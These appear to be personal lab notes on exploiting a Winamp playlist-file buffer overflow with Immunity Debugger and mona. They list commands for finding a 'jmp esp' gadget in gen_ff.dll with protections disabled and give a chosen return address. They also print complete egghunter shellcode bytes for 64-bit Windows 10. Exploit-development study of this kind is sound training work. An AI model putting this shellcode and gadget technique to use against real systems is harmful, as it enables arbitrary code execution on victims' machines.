immunity: set options

* ignore exceptions (via: add latest) before pressing `shift-f9` to pass it
* set proper font (Consolas, regular, 14pt)

---

immunity debugger

* `alt-o` options
* `alt-c` CPU
* `alt-l` log (mona output)

---

winamp

* `alt-3` show file info (take a look at the exploit)
* `str-o` open playlist file
* `x` play

---

* `!mona config -set workingfolder Z:\WH3`
* run program in debugger!
* `!mona jmp -n -r esp -cm safeseh=false,rebase=false,aslr=false`
  * find `jmp esp` (`-r` is target register)
  * `-n` skips addresses starting with NULL byte
  * `-cm` speficy options
  * this took very long! (much faster with `-cm`!)
* let's use `0x1a113749` gen_ff.dll
  * `break 0x1a113749`
    * immunity tends to forget breakpoints, so let's keep this
* `!mona egg -wow64 -winver10`

from egghunter.txt:

```sh
"\x33\xd2\x66\x81\xca\xff\x0f\x33\xdb\x42\x53\x53\x52\x53\x53\x53"
"\x6a\x29\x58\xb3\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4\x08\x3c"
"\x05\x74\xdf\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xda\xaf\x75\xd7"
"\xff\xe7"
```
write it to eggh-mona.txt
